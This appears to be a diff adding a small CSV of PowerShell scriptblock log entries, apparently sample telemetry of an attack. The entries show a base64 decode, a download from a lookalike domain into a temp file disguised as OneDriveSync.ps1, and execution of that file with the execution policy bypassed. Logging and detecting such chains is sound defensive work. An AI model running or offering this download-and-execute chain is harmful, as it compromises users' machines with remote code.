@@ -1,0 +1,4 @@
+time,scriptblock
+2026-02-11T08:19:02Z,[System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAYgBsAGUALgBQAFMAVgBlAHIAcwBpAG8AbgApAA=='))
+2026-02-11T08:19:03Z,Invoke-RestMethod -Uri https://cdn.mshelperassets.com/bootstrap?id=88411 -OutFile $env:TEMP\OneDriveSync.ps1
+2026-02-11T08:19:07Z,powershell -ExecutionPolicy Bypass -File $env:TEMP\OneDriveSync.ps1
